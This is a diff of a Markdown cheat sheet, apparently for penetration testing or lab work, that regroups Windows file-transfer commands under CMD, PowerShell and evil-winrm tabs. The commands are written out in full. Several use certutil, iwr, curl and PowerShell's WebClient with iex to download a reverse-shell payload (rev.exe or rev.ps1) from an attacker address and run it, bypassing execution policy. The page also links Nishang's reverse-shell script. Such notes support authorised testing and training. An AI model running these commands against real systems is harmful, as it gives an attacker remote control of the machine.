@@ -5,15 +5,24 @@ tags: ["file transfer", "Windows", "evil-winrm"]
 ---
 
 ---
-### HTTP
+{{< tab set1 tab1 active >}}CMD{{< /tab >}}
+{{< tab set1 tab2 >}}Powershell{{< /tab >}}
+{{< tab set1 tab3 >}}evil-winrm{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
 
 #### Start a Local HTTP Server
+
+<div>
 
 ```bash
 python3 -m http.server 80
 ```
 
-#### cmd
+</div>
+
+<br>
+
+<div>
 
 ```bash
 certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe
@@ -24,7 +33,24 @@ certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe
 certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe && C:\ProgramData\rev.exe
 ```
 
-#### powershell
+</div>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+#### Start a Local HTTP Server
+
+<div>
+
+```bash
+python3 -m http.server 80
+```
+
+</div>
+
+<br>
+
+<div>
 
 ```powershell
 # Long version
@@ -38,6 +64,10 @@ iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
 
 <small>*Note: PowerShell 3.0+*</small>
 
+</div>
+
+<div>
+
 ```powershell
 # Long version
 powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
@@ -49,6 +79,10 @@ powershell -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
 ```
 
 <small>*Note: curl is not always available*</small>
+
+</div>
+
+<div>
 
 ```powershell
 # Load into memory and Run
@@ -69,15 +103,22 @@ iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1');Invo
 iex (iwr http://10.10.14.10/rev.ps1)
 ```
 
-<small>*Note: [rev.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)*</small>
+<small>*Ref: [rev.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)*</small>
 
----
+</div>
 
-### Evil-winrm
+{{< /tabcontent >}}
+{{< tabcontent set1 tab3 >}}
+
+<div>
 
 ```bash
 # Evil-winrm built-in function
 upload "/tmp/example.txt" "C:\ProgramData\example.txt"
 ```
+
+</div>
+
+{{< /tabcontent >}}
 
 <br>
